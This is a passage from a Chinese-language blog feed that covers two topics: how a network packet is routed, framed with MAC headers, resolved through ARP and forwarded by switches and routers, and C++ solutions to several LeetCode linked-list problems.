type="1"><li>首先先和第一条目的子网掩码（<code>Genmask</code>）进行<strong>与运算</strong>，得到结果为<code>192.168.10.0</code>，但是第一个条目的 <code>Destination</code> 是<code>192.168.3.0</code>，两者不一致所以匹配失败。</li><li>再与第二条目的子网掩码进行 <strong>与运算</strong>，得到的结果为<code>192.168.10.0</code>，与第二条目的<code>Destination 192.168.10.0</code> 匹配成功，所以将使用<code>eth1</code> 网卡的 IP 地址作为 IP 包头的源地址。</li></ol><p>那么假设 Web 服务器的目标地址是<code>10.100.20.100</code>，那么依然依照上面的路由表规则判断，判断后的结果是和第三条目匹配。第三条目比较特殊，它目标地址和子网掩码都是<code>0.0.0.0</code>，这表示<strong>默认网关</strong>，如果其他所有条目都无法匹配，就会自动匹配这一行。并且后续就把包发给路由器，<code>Gateway</code>即是路由器的 IP 地址。</p><h3 id="生成报文-1">2.5.3 生成报文</h3><p>至此，网络包的报文如下图。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191432912.jpg"alt="IP 层报文" /><figcaption aria-hidden="true">IP 层报文</figcaption></figure><h2 id="mac-1">2.6 MAC</h2><p>生成了 IP 头部之后，接下来网络包还需要在 IP 头部的前面加上<strong>MAC 头部</strong>。</p><h3 id="报文格式-2">2.6.1 报文格式</h3><p>MAC 头部是以太网使用的头部，它包含了接收方和发送方的 MAC地址等信息。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191432913.png"alt="image-20240319135207415" /><figcaption aria-hidden="true">image-20240319135207415</figcaption></figure><p>在 MAC 包头里需要<strong>发送方 MAC 地址</strong>和<strong>接收方目标MAC 地址</strong>，用于<strong>两点之间的传输</strong>。</p><p>一般在 TCP/IP 通信里，MAC 包头的<strong>协议类型</strong>只使用：</p><ul><li><code>0800</code> ： IP 协议</li><li><code>0806</code> ： ARP 协议</li></ul><h3 id="地址获取">2.6.2 地址获取</h3><p><strong>发送方</strong>的 MAC 地址获取就比较简单了，MAC地址是在网卡生产时写入到 ROM 里的，只要将这个值读取出来写入到 MAC头部就可以了。</p><p><strong>接收方</strong>的 MAC 地址就有点复杂了，只要告诉以太网对方的MAC 的地址，以太网就会帮我们把包发送过去，那么很显然这里应该填写对方的MAC 地址。</p><p>所以先得搞清楚应该把包发给谁，这个只要查一下<strong>路由表</strong>就知道了。在路由表中找到相匹配的条目，然后把包发给<code>Gateway</code> 列中的 IP 地址就可以了。</p><blockquote><p>既然知道要发给谁，按如何获取对方的 MAC 地址呢？</p></blockquote><p>不知道对方 MAC 地址？不知道就喊呗。此时就需要 <code>ARP</code>协议帮我们找到路由器的 MAC 地址。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191432914.png"alt="image-20240319135335133" /><figcaption aria-hidden="true">image-20240319135335133</figcaption></figure><p>ARP协议会在以太网中以<strong>广播</strong>的形式，对以太网所有的设备喊出：“这个IP 地址是谁的？请把你的 MAC 地址告诉我”。然后就会有人回答：“这个 IP地址是我的，我的 MAC 地址是XXXX”。如果对方和自己处于同一个子网中，那么通过上面的操作就可以得到对方的MAC 地址。然后，我们将这个 MAC 地址写入 MAC 头部，MAC 头部就完成了。</p><h3 id="arp缓存">2.6.3 ARP缓存</h3><blockquote><p>每次都要广播获取，这不是很麻烦吗？</p></blockquote><p>后续操作系统会把本次查询结果放到一块叫做 <strong>ARP缓存</strong>的内存空间留着以后用，不过缓存的时间就几分钟。也就是说，在发包时：</p><ul><li>先查询 ARP 缓存，如果其中已经保存了对方的 MAC 地址，就不需要发送 ARP查询，直接使用 ARP 缓存中的地址。</li><li>而当 ARP 缓存中不存在对方 MAC 地址时，则发送 ARP 广播查询。</li></ul><p>在 Linux 系统中，我们可以使用 <code>arp -a</code> 命令来查看 ARP缓存的内容。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191432915.png"alt="image-20240319135440846" /><figcaption aria-hidden="true">image-20240319135440846</figcaption></figure><h3 id="生成报文-2">2.6.4 生成报文</h3><p>至此，网络包的报文如下图。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191432916.jpg"alt="MAC 层报文" /><figcaption aria-hidden="true">MAC 层报文</figcaption></figure><h2 id="网卡">2.7 网卡</h2><p>网络包只是存放在内存中的一串二进制数字信息，没有办法直接发送给对方。因此，我们需要将<strong>数字信息转换为电信号</strong>，才能在网线上传输，也就是说，这才是真正的数据发送过程。负责执行这一操作的是<strong>网卡</strong>，要控制网卡还需要靠<strong>网卡驱动程序</strong>。网卡驱动获取网络包之后，会将其<strong>复制</strong>到网卡内的缓存区中，接着会在其<strong>开头</strong>加上<strong>报头和起始帧分界符</strong>，在<strong>末尾</strong>加上用于检测错误的<strong>帧校验序列</strong>。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191432917.png"alt="数据包" /><figcaption aria-hidden="true">数据包</figcaption></figure><ul><li>起始帧分界符是一个用来表示包起始位置的标记</li><li>末尾的<code>FCS</code>（帧校验序列）用来检查包传输过程是否有损坏</li></ul><p>最后网卡会将包转为电信号，通过网线发送出去。</p><h2 id="交换机">2.8 交换机</h2><p>交换机的设计是将网络包<strong>原样</strong>转发到目的地。交换机工作在MAC 层，也称为<strong>二层网络设备</strong>。</p><h3 id="数据包接收">2.8.1 数据包接收</h3><p>首先，电信号到达网线接口，交换机里的模块进行接收，接下来交换机里的模块将电信号转换为数字信号。</p><p>然后通过包末尾的 <code>FCS</code>校验错误，如果没问题则放到缓冲区。这部分操作基本和计算机的网卡相同，但交换机的工作方式和网卡不同。</p><p>计算机的网卡本身具有 MAC 地址，并通过核对收到的包的接收方 MAC地址判断是不是发给自己的，如果不是发给自己的则丢弃；相对地，交换机的端口不核对接收方MAC地址，而是直接<strong>接收所有的包</strong>并存放到缓冲区中。<strong>因此，和网卡不同，交换机的端口不具有MAC 地址。</strong></p><h3 id="mac地址表">2.8.2 MAC地址表</h3><p>将包存入缓冲区后，接下来需要查询一下这个包的接收方 MAC 地址是否已经在MAC 地址表中有记录了。交换机的 MAC 地址表主要包含两个信息：</p><ul><li>设备的 MAC 地址</li><li>该设备连接在交换机的哪个端口上</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191432918.jpg"alt="交换机的 MAC 地址表" /><figcaption aria-hidden="true">交换机的 MAC 地址表</figcaption></figure><p><strong>交换机根据 MAC 地址表查找 MAC地址，然后将信号发送到相应的端口</strong>。举个例子，如果收到的包的接收方MAC 地址为 <code>00-02-B3-1C-9C-F9</code>，则与图中表中的第 3行匹配，根据端口列的信息，可知这个地址位于 <code>3</code>号端口上，然后就可以通过交换电路将包发送到相应的端口了。</p><blockquote><p>当 MAC 地址表找不到指定的 MAC 地址会怎么样？</p></blockquote><p>地址表中找不到指定的 MAC地址。这可能是因为具有该地址的设备还没有向交换机发送过包，或者这个设备一段时间没有工作导致地址被从地址表中删除了。这种情况下，交换机无法判断应该把包转发到哪个端口，只能将包转发到除了源端口之外的所有端口上，无论该设备连接在哪个端口上都能收到这个包。这样做不会产生什么问题，因为以太网的设计本来就是将包发送到整个网络的，然后<strong>只有相应的接收者才接收包，而其他设备则会忽略这个包</strong>。</p><p>有人会说：“这样做会发送多余的包，会不会造成网络拥塞呢？”其实完全不用过于担心，因为发送了包之后目标设备会作出响应，只要返回了响应包，交换机就可以将它的地址写入MAC地址表，下次也就不需要把包发到所有端口了。局域网中每秒可以传输上千个包，多出一两个包并无大碍。</p><p>此外，如果接收方 MAC地址是一个<strong>广播地址</strong>，那么交换机会将包发送到除源端口之外的所有端口。以下两个属于广播地址：</p><ul><li>MAC 地址中的 <code>FF:FF:FF:FF:FF:FF</code></li><li>IP 地址中的 <code>255.255.255.255</code></li></ul><h2 id="路由器">2.9 路由器</h2><h3 id="路由器与交换机的区别">2.9.1 路由器与交换机的区别</h3><p>网络包经过交换机之后，现在到达了<strong>路由器</strong>，并在此被转发到下一个路由器或目标设备。这一步转发的工作原理和交换机类似，也是通过查表判断包转发的目标。不过在具体的操作过程上，路由器和交换机是有区别的。</p><ul><li>因为<strong>路由器</strong>是基于 IP设计的，俗称<strong>三层</strong>网络设备，路由器的各个端口都具有 MAC地址和 IP 地址；</li><li>而<strong>交换机</strong>是基于以太网设计的，俗称<strong>二层</strong>网络设备，交换机的端口不具有MAC 地址。</li></ul><h3 id="基本原理">2.9.2 基本原理</h3><p>路由器的端口具有 MAC地址，因此它就能够成为以太网的发送方和接收方；同时还具有 IP地址，从这个意义上来说，它和计算机的网卡是一样的。当转发包时，首先路由器端口会接收发给自己的以太网包，然后<strong>路由表</strong>查询转发目标，再由相应的端口作为发送方将以太网包发送出去。</p><h3 id="数据包接收-1">2.9.3 数据包接收</h3><p>首先，电信号到达网线接口部分，路由器中的模块会将电信号转成数字信号，然后通过包末尾的<code>FCS</code> 进行错误校验。如果没问题则检查 MAC头部中的<strong>接收方 MAC地址</strong>，看看是不是发给自己的包，如果是就放到接收缓冲区中，否则就丢弃这个包。总的来说，路由器的端口都具有MAC 地址，只接收与自身地址匹配的包，遇到不匹配的包则直接丢弃。</p><h3 id="路由表">2.9.4 路由表</h3><p>完成包接收操作之后，路由器就会<strong>去掉</strong>包开头的 MAC头部。<strong>MAC 头部的作用就是将包送达路由器</strong>，其中的接收方MAC 地址就是路由器端口的 MAC 地址。因此，当包到达路由器之后，MAC头部的任务就完成了，于是 MAC头部就会<strong>被丢弃</strong>。接下来，路由器会根据 MAC 头部后方的<code>IP</code> 头部中的内容进行包的转发操作。</p><p>转发操作分为几个阶段，首先是查询<strong>路由表</strong>判断转发目标。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191432919.jpg"alt="路由器转发" /><figcaption aria-hidden="true">路由器转发</figcaption></figure><p>具体的工作流程如上图。举假设地址为 <code>10.10.1.101</code>的计算机要向地址为 <code>192.168.1.100</code>的服务器发送一个包，这个包先到达图中的路由器。判断转发目标的第一步，就是根据包的接收方IP地址查询路由表中的目标地址栏，以找到相匹配的记录。路由匹配和前面讲的一样，每个条目的子网掩码和<code>192.168.1.100</code> IP 做 <strong>&amp;与运算</strong>后，得到的结果与对应条目的目标地址进行匹配，如果匹配就会作为候选转发目标，如果不匹配就继续与下个条目进行路由匹配。如第二条目的子网掩码<code>255.255.255.0</code> 与 <code>192.168.1.100</code> IP 做<strong>&amp; 与运算</strong>后，得到结果是 <code>192.168.1.0</code>，这与第二条目的目标地址 <code>192.168.1.0</code>匹配，该第二条目记录就会被作为转发目标。实在找不到匹配路由时，就会选择<strong>默认路由</strong>，路由表中子网掩码为<code>0.0.0.0</code> 的记录表示「默认路由」。</p><h3 id="数据包发送">2.9.5 数据包发送</h3><p>接下来就会进入包的<strong>发送操作</strong>。首先，我们需要根据<strong>路由表的网关列</strong>判断对方的地址。</p><ul><li>如果网关是一个 IP 地址，则这个IP地址就是我们要转发到的目标地址，<strong>还未抵达终点</strong>，还需继续需要路由器转发。</li><li>如果网关为空，则 IP 头部中的接收方 IP地址就是要转发到的目标地址，也是就终于找到 IP包头里的目标地址了，说明<strong>已抵达终点</strong>。</li></ul><p>知道对方的 IP 地址之后，接下来需要通过 <code>ARP</code> 协议根据 IP地址查询 MAC 地址，并将查询的结果作为接收方 MAC 地址。路由器也有 ARP缓存，因此首先会在 ARP 缓存中查询，如果找不到则发送 ARP查询请求。接下来是发送方 MAC 地址字段，这里填写输出端口的 MAC地址。还有一个以太类型字段，填写 <code>0800</code> （十六进制）表示 IP协议。</p><p>网络包完成后，接下来会将其转换成电信号并通过端口发送出去。这一步的工作过程和计算机也是相同的。发送出去的网络包会通过交换机到达下一个路由器。由于接收方MAC地址就是下一个路由器的地址，所以交换机会根据这一地址将包传输到下一个路由器。接下来，下一个路由器会将包转发给再下一个路由器，经过层层转发之后，网络包就到达了最终的目的地。</p><p>在网络包传输的过程中，<strong>源 IP 和目标 IP始终是不会变的，一直变化的是 MAC 地址</strong>，因为需要 MAC地址在以太网内进行<strong>两个设备</strong>之间的包传输。（前提：没有使用NAT 网络）</p><h2 id="服务器客户端">2.10 服务器&amp;客户端</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403191432920.jpg"alt="网络分层模型" /><figcaption aria-hidden="true">网络分层模型</figcaption></figure><p>数据包抵达服务器后，服务器会先扒开数据包的 MAC头部，查看是否和服务器自己的 MAC地址符合，符合就将包收起来。接着继续扒开数据包的 IP 头，发现 IP地址符合，根据 IP 头中协议项，知道自己上层是 TCP 协议。于是，扒开 TCP的头，里面有序列号，需要看一看这个序列包是不是我想要的，如果是就放入缓存中然后返回一个ACK，如果不是就丢弃。TCP头部里面还有端口号， HTTP的服务器正在监听这个端口号。</p><p>于是，服务器自然就知道是 HTTP 进程想要这个包，于是就将包发给 HTTP进程。服务器的 HTTP进程看到，原来这个请求是要访问一个页面，于是就把这个网页封装在 HTTP响应报文里。</p><p>HTTP 响应报文也需要穿上 TCP、IP、MAC 头部，不过这次是源地址是服务器IP 地址，目的地址是客户端 IP地址。穿好头部衣服后，从网卡出去，交由交换机转发到出城的路由器，路由器就把响应数据包发到了下一个路由器，就这样跳啊跳。最后跳到了客户端的城门把守的路由器，路由器扒开IP头部发现是要找城内的人，于是又把包发给了城内的交换机，再由交换机转发到客户端。</p><p>客户端收到了服务器的响应数据包后，同样也非常的高兴，客户能拆快递了！于是，客户端开始扒皮，把收到的数据包的皮扒剩HTTP响应报文后，交给浏览器去渲染页面，一份特别的数据包快递，就这样显示出来了！</p><p>最后，客户端要离开了，向服务器发起了 TCP四次挥手，至此双方的连接就断开了。</p><p><strong>参考链接：</strong></p><ol type="1"><li>图解网络：https://xiaolincoding.com/network</li><li>细说TCP的MSS选项(1)：https://cloud.tencent.com/developer/article/1411976</li><li>以太网中的 MTU 与MSS：https://wulc.me/2015/12/08/%E4%BB%A5%E5%A4%AA%E7%BD%91%E4%B8%AD%E7%9A%84MTU%E4%B8%8EMSS/</li><li>计网 - IPv4协议：路由和寻址的区别是什么？https://cloud.tencent.com/developer/article/1862661</li><li>既然有了IP地址，为什么还需要MAC地址？两者到底有啥区别，深入分析后终于明白了！https://bbs.huaweicloud.com/blogs/399411</li></ol>]]></content>
    
    
    <categories>
      
      <category>计算机核心课程</category>
      
      <category>计算机网络</category>
      
      <category>图解网络</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>链表篇</title>
    <link href="/2024/03/18/LeetCode/%E9%93%BE%E8%A1%A8%E7%AF%87/"/>
    <url>/2024/03/18/LeetCode/%E9%93%BE%E8%A1%A8%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="移除与插入链表元素">1. 移除与插入链表元素</h1><h2 id="设计链表">设计链表</h2><blockquote><p>单向链表：实现单向链表，即每个节点仅存储本身的值和后继节点。除此之外，还需要一个哨兵（sentinel）节点作为头节点，和一个size参数保存有效节点数。<code>ListNode</code>在<code>/leetcode/precompiled/ListNode.h</code>中定义。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyLinkedList</span> &#123;<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-type">int</span> size;<br>    ListNode* head;<br><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">MyLinkedList</span>() &#123;<br>        <span class="hljs-keyword">this</span>-&gt;size = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">this</span>-&gt;head = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-type">int</span> index)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (index &lt; <span class="hljs-number">0</span> || index &gt;= size) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>        ListNode* cur = head;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= index; i++) &#123;<br>            cur = cur-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">return</span> cur-&gt;val;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">addAtHead</span><span class="hljs-params">(<span class="hljs-type">int</span> val)</span> </span>&#123; <span class="hljs-built_in">addAtIndex</span>(<span class="hljs-number">0</span>, val); &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">addAtTail</span><span class="hljs-params">(<span class="hljs-type">int</span> val)</span> </span>&#123; <span class="hljs-built_in">addAtIndex</span>(size, val); &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">addAtIndex</span><span class="hljs-params">(<span class="hljs-type">int</span> index, <span class="hljs-type">int</span> val)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (index &gt; size) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        index = <span class="hljs-built_in">max</span>(<span class="hljs-number">0</span>, index);<br>        size++;<br>        ListNode* pred = head;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; index; i++) &#123;<br>            pred = pred-&gt;next;<br>        &#125;<br>        ListNode* temp = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(val);<br>        temp-&gt;next = pred-&gt;next;<br>        pred-&gt;next = temp;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">deleteAtIndex</span><span class="hljs-params">(<span class="hljs-type">int</span> index)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (index &lt; <span class="hljs-number">0</span> || index &gt;= size) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        size--;<br>        ListNode* pred = head;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; index; i++) &#123; <br>            pred = pred-&gt;next; <br>        &#125;<br>        ListNode* temp = pred-&gt;next;<br>        pred-&gt;next = pred-&gt;next-&gt;next;<br>        <span class="hljs-keyword">delete</span> temp;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="移除链表元素">移除链表元素</h2><blockquote><p>法一：使用了一个虚拟头结点<code>dummyHead</code>，它的值不存储实际的数据，仅作为一个占位符。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">removeElements</span><span class="hljs-params">(ListNode* head, <span class="hljs-type">int</span> val)</span> </span>&#123;<br>        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">ListNode</span>* dummyHead = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">0</span>, head);<br>        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">ListNode</span>* current = dummyHead;<br>        <span class="hljs-keyword">while</span> (current-&gt;next != <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-keyword">if</span> (current-&gt;next-&gt;val == val) &#123;<br>                current-&gt;next = current-&gt;next-&gt;next;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                current = current-&gt;next;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> dummyHead-&gt;next;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>法二：递归。对于给定的链表，首先对除了头节点 head以外的节点进行删除操作，然后判断 head 的节点值是否等于给定的 val。如果head 的节点值等于 val，则 head 需要被删除，因此删除操作后的头节点为head-&gt;next；如果 head 的节点值不等于 val，则 head保留，因此删除操作后的头节点还是head。上述过程是一个递归的过程。递归的终止条件是 head 为空，此时直接返回head。当 head 不为空时，递归地进行删除操作，然后判断 head的节点值是否等于 val 并决定是否要删除 head。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">removeElements</span><span class="hljs-params">(ListNode* head, <span class="hljs-type">int</span> val)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">nullptr</span>) &#123;<br>            <span class="hljs-keyword">return</span> head;<br>        &#125;<br>        head-&gt;next = <span class="hljs-built_in">removeElements</span>(head-&gt;next, val);<br>        <span class="hljs-keyword">return</span> head-&gt;val == val ? head-&gt;next : head;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="删除链表中的节点">删除链表中的节点</h2><blockquote><p>被删除的节点不是链表的末尾节点，且不要求从内存中删除，因此直接将当前节点的参数设为下一节点的参数。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">deleteNode</span><span class="hljs-params">(ListNode* node)</span> </span>&#123;<br>        node-&gt;val = node-&gt;next-&gt;val;<br>        node-&gt;next = node-&gt;next-&gt;next;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="删除链表的倒数第-n-个结点">删除链表的倒数第 N 个结点</h2><blockquote><p>使用两个指针 fast 和 slow 同时对链表进行遍历，并且 fast 比 slow 超前n 个节点。当 first 遍历到链表的末尾时，second 就恰好处于倒数第 n+1个节点。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">removeNthFromEnd</span><span class="hljs-params">(ListNode* head, <span class="hljs-type">int</span> n)</span> </span>&#123;<br>        ListNode* dummyHead = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">0</span>, head);<br>        ListNode* fast = dummyHead;<br>        ListNode* slow = dummyHead;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            fast = fast-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">while</span> (fast-&gt;next != <span class="hljs-literal">NULL</span>) &#123;<br>            fast = fast-&gt;next;<br>            slow = slow-&gt;next;<br>        &#125;<br>        ListNode* temp = slow-&gt;next;<br>        slow-&gt;next = temp -&gt; next;<br>        <span class="hljs-keyword">delete</span> temp;<br><br>        <span class="hljs-keyword">return</span> dummyHead-&gt;next;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="删除排序链表中的重复元素">删除排序链表中的重复元素</h2><blockquote><p>从头节点开始遍历链表。对于每个节点，检查它的下一个节点是否存在且与当前节点的值相同。如果相同，则删除下一个节点；否则，继续遍历到下一个节点。返回头节点。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">deleteDuplicates</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (!head) &#123;<br>            <span class="hljs-keyword">return</span> head;<br>        &#125;<br><br>        ListNode* cur = head;<br>        <span class="hljs-keyword">while</span> (cur-&gt;next) &#123;<br>            <span class="hljs-keyword">if</span> (cur-&gt;val == cur-&gt;next-&gt;val) &#123;<br>                cur-&gt;next = cur-&gt;next-&gt;next;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                cur = cur-&gt;next;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="删除排序链表中的重复元素ii">删除排序链表中的重复元素II</h2><blockquote><p>通过遍历链表，当发现相邻节点的值相同时，删除所有连续重复值的节点，直到遇到一个不同值的节点为止，最后返回处理后的链表。由于链表的头节点可能会被删除，因此我们需要额外使用一个哑节点指向链表的头节点。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">deleteDuplicates</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (!head) &#123;<br>            <span class="hljs-keyword">return</span> head;<br>        &#125;<br>        <br>        ListNode* dummy = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">0</span>, head);<br><br>        ListNode* cur = dummy;<br>        <span class="hljs-keyword">while</span> (cur-&gt;next &amp;&amp; cur-&gt;next-&gt;next) &#123;<br>            <span class="hljs-keyword">if</span> (cur-&gt;next-&gt;val == cur-&gt;next-&gt;next-&gt;val) &#123;<br>                <span class="hljs-type">int</span> x = cur-&gt;next-&gt;val;<br>                <span class="hljs-keyword">while</span> (cur-&gt;next &amp;&amp; cur-&gt;next-&gt;val == x) &#123;<br>                    cur-&gt;next = cur-&gt;next-&gt;next;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                cur = cur-&gt;next;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> dummy-&gt;next;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="链表的遍历">2. 链表的遍历</h1><h2 